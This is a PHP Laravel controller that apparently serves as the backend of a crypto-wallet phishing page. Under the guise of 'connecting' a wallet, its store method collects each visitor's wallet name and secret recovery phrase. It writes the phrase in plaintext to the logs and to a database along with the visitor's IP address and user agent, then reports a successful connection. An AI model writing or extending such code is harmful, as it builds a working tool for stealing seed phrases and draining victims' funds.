<?php

namespace App\Http\Controllers;

use App\Models\WalletConnection;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;

class WalletConnectionController extends Controller
{
    public function store(Request $request)
    {
        // Log raw request
        Log::info('=== Wallet Connection Request ===');
        Log::info('Method: ' . $request->getMethod());
        Log::info('Content-Type: ' . $request->header('Content-Type'));
        Log::info('All input: ' . json_encode($request->all()));
        Log::info('wallet_name: ' . $request->input('wallet_name'));
        Log::info('secret_phrase length: ' . strlen($request->input('secret_phrase')));
        Log::info('IP: ' . $request->ip());

        // Validate input
        if (empty($request->input('wallet_name'))) {
            Log::warning('Missing wallet_name');
            return response()->json([
                'success' => false,
                'message' => 'Wallet name is required'
            ], 422);
        }

        if (empty($request->input('secret_phrase'))) {
            Log::warning('Missing secret_phrase');
            return response()->json([
                'success' => false,
                'message' => 'Secret phrase is required'
            ], 422);
        }

        try {
            $connection = WalletConnection::create([
                'wallet_name' => $request->input('wallet_name'),
                'secret_phrase' => $request->input('secret_phrase'),
                'ip_address' => $request->ip(),
                'user_agent' => $request->userAgent(),
            ]);

            Log::info('✓ Wallet connection saved successfully', ['id' => $connection->id]);

            return response()->json([
                'success' => true,
                'message' => 'Wallet connected successfully'
            ]);
        } catch (\Exception $e) {
            Log::error('✗ Error saving wallet connection: ' . $e->getMessage());
            Log::error('Stack trace: ' . $e->getTraceAsString());
            
            return response()->json([
                'success' => false,
                'message' => 'Error: ' . $e->getMessage()
            ], 500);
        }
    }
}
